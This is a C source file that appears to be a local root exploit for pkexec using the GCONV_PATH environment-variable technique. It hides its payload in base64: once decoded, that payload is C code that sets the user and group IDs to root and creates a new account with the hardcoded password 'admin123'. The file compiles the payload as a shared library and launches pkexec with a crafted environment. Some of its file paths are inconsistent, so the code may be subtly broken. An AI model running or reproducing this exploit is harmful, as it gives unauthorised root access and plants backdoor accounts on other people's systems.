//
// Created by Tahaa on 20/12/2022.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char* pkexec_path = "/usr/bin/pkexec";
    char* null_args[] = {NULL};
    char* pkexec_env[] = {"tmp", "CHARSET=POPPY", "SHELL=x", "PATH=GCONV_PATH=.", "GIO_USE_VFS=", NULL};

    system("mkdir 'GCONV_PATH=.'; touch 'GCONV_PATH=./tmp'; chmod +x 'GCONV_PATH=./tmp'");
    system("mkdir tmp;echo Ly8KLy8gQ3JlYXRlZCBieSBUYWhhYSBvbiAyMC8xMi8yMDIyLgovLwojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgoKdm9pZCBnY29udigpIHt9Cgp2b2lkIGdjb252X2luaXQoKSB7CiAgICBzZXR1aWQoMCk7CiAgICBzZXRnaWQoMCk7CiAgICBzZXRldWlkKDApOwogICAgc2V0ZWdpZCgwKTsKICAgIHN5c3RlbSgiL3Vzci9iaW4vc3VkbyAtdSByb290IGJhc2ggLWMgJ3VzZXJhZGQgLW0gcm9vdCAtcyAvYmluL2Jhc2ggLXAgJChlY2hvIGFkbWluMTIzIHwgb3BlbnNzbCBwYXNzd2QgLXN0ZGluIC0xKSBkYnVzdSciKTsKICAgIGV4aXQoMCk7Cn0= | base64 -d > tmp/payload.c; gcc tmp/payload.c -o tmp/poppy.so -shared -fPIC");
    system("echo bW9kdWxlIFVURi04Ly8gUE9QUFkvLyBwb3BweSAyCg== | base64 -d > /tmp/gconv-modules");

    execve(pkexec_path, null_args, pkexec_env);
}